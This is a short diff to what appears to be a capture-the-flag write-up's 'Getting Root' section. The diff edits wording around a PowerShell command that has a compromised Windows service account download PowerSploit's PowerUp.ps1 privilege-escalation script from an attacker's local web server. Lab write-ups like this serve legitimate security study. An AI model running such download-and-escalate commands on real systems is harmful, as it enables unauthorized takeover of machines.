@@ -333,9 +333,9 @@ c37b41bb669da345bb14de50faab3c16
 {% endhighlight %}
 
 ### 3. Getting Root
-We can take advantage of <a href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a>.<br><br>
+We can take advantage of <a href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a>.<br>
 
-At first, upload the script.
+At first, upload the script with launching a webserver on the localhost.
 {% highlight shell %}
 C:\Users\mssql-svc\Desktop>powershell Invoke-WebRequest -Uri 10.10.14.2/Privesc/PowerUp.ps1 -Outfile PowerUp.ps1
 powershell Invoke-WebRequest -Uri 10.10.14.2/Privesc/PowerUp.ps1 -Outfile PowerUp.ps1
